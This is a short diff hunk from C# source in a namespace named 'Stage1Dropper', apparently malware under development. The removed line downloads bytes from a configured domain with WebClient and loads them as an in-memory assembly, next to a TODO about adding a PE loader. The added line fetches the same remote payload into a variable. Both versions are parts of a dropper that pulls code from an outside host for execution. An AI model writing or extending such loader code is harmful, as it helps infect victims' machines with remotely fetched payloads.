@@ -51,8 +51,7 @@ namespace Stage1Dropper
                 if (Domain!="")
                 {
                 WebClient Wclient = new WebClient();
-                Assembly.Load(Compress(Wclient.DownloadData(Domain))); 
-                //TODO Add execution method, say PEloader?!?!
+                casper= Wclient.DownloadData(Domain); 
                 }
                 else
                 {
